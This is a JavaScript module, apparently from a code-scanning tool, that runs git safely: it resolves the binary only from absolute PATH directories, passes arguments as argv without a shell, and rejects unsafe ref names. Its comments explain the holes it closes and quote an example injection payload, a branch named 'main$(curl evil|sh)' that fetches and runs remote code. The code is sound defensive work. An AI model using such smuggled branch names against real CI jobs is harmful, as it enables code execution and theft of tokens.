import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

/**
 * WHICH `git` RUNS - NEVER ONE THE SCANNED REPOSITORY SHIPS.
 *
 * ⚠ On Windows a bare `git` is looked for in the working directory BEFORE PATH:
 * cmd.exe does it for `execSync('git …')` (trying git.exe, git.bat, git.cmd…),
 * and Node does it for `execFileSync('git')` (git.exe, git.com) unless
 * NoDefaultCurrentDirectoryInExePath is set - which on a developer's machine or
 * a Windows CI runner it normally is not. The working directory is the
 * repository being checked, so a `git.bat` committed to a pull request ran the
 * moment `shomra check` looked at it - with the job's token in its environment,
 * or on the laptop of whoever opened the repo in the editor extension. git is
 * resolved here against ABSOLUTE PATH directories only and always run by its full
 * path; no git on PATH means no git, which every caller already treats as
 * "not a repository".
 */
export function resolveOnPath(name, env = process.env, platform = process.platform) {
  const p = platform === 'win32' ? path.win32 : path.posix;
  const names = platform === 'win32' ? [`${name}.exe`, `${name}.com`] : [name];
  for (const raw of String(env.PATH ?? env.Path ?? '').split(p.delimiter)) {
    const dir = raw.trim().replace(/^"(.*)"$/, '$1');
    if (!dir || !p.isAbsolute(dir)) continue;
    for (const n of names) {
      const candidate = p.join(dir, n);
      try {
        if (!fs.statSync(candidate).isFile()) continue;
        if (platform !== 'win32') fs.accessSync(candidate, fs.constants.X_OK);
        return candidate;
      } catch {
        /* not in this directory */
      }
    }
  }
  return null;
}

let gitBinary;
function gitPath() {
  if (gitBinary === undefined) gitBinary = resolveOnPath('git');
  return gitBinary;
}

/**
 * GIT, WITHOUT A SHELL.
 *
 * ⚠ `execSync(`git ${args}`)` handed the whole line to a shell, and part of that
 * line was a BRANCH NAME - from `--base`, from `GITHUB_BASE_REF`, or from the
 * pull-request event payload. `$(...)`, `;` and `|` are all legal in a git ref,
 * so a branch called `main$(curl evil|sh)` ran inside the customer's CI job,
 * with the job's GitHub token in its environment. Arguments now go to git as an
 * argv array, where a metacharacter is just a character.
 */
export function git(args, { cwd, timeout = 5000, maxBuffer = 16 * 1024 * 1024 } = {}) {
  const bin = gitPath();
  if (!bin) return null;
  try {
    return execFileSync(bin, args, { cwd, stdio: ['ignore', 'pipe', 'ignore'], timeout, maxBuffer, windowsHide: true }).toString();
  } catch {
    return null;
  }
}

/**
 * A ref we are willing to pass as a REVISION argument.
 *
 * ⚠ argv closes the shell hole, not the option hole: a ref beginning with `-` is
 * read by git as a flag (`--output=/etc/...`). Refused, along with anything git's
 * own check-ref-format would refuse.
 */
export function safeRef(ref) {
  const r = String(ref ?? '').trim();
  if (!r || r.length > 200) return null;
  if (r.startsWith('-') || r.includes('..') || r.endsWith('.lock') || r.endsWith('/') || r.endsWith('.')) return null;
  if (!/^[A-Za-z0-9._\/+-]+$/.test(r)) return null;
  return r;
}
